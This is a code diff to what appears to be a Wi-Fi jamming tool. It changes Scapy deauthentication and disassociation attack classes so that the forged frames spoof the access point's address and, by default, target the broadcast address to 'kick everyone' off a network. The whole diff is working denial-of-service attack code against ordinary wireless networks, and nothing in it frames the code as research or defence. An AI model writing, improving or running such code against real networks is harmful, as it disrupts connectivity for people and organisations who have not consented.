@@ -4,7 +4,7 @@ Deauthentication attack implementation.
 
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas
-from .base_attack import BaseAttack
+from wifi_jammer.attacks.base_attack import BaseAttack
 
 
 class DeauthAttack(BaseAttack):
@@ -17,15 +17,19 @@ class DeauthAttack(BaseAttack):
             return None
         
         try:
+            # Kick everyone by default if no specific target (addr1) is in config
+            # Destination is the client (or broadcast), Source is the AP
+            destination = self._config.target_client or "ff:ff:ff:ff:ff:ff"
+            
             # Create deauthentication packet
             packet = (
                 RadioTap() /
                 Dot11(
-                    addr1=self._config.target_bssid,  # Destination (AP)
-                    addr2=self._get_source_mac(),     # Source (attacker)
+                    addr1=destination,               # Destination (Station)
+                    addr2=self._config.target_bssid,  # Source (AP)
                     addr3=self._config.target_bssid   # BSSID
                 ) /
-                Dot11Deauth(reason=7)  # Class 3 frame received from unauthenticated STA
+                Dot11Deauth(reason=7)
             )
             
             return packet
@@ -45,19 +49,22 @@ class DisassocAttack(BaseAttack):
             return None
         
         try:
+            destination = self._config.target_client or "ff:ff:ff:ff:ff:ff"
+            
             # Create disassociation packet
             packet = (
                 RadioTap() /
                 Dot11(
-                    addr1=self._config.target_bssid,  # Destination (AP)
-                    addr2=self._get_source_mac(),     # Source (attacker)
+                    addr1=destination,               # Destination (Station)
+                    addr2=self._config.target_bssid,  # Source (AP)
                     addr3=self._config.target_bssid   # BSSID
                 ) /
-                Dot11Disas(reason=7)  # Class 3 frame received from unassociated STA
+                Dot11Disas(reason=7)
             )
             
             return packet
             
         except Exception as e:
             self.logger.error(f"Failed to create disassoc packet: {e}")
-            return None 
+            return None
+ 
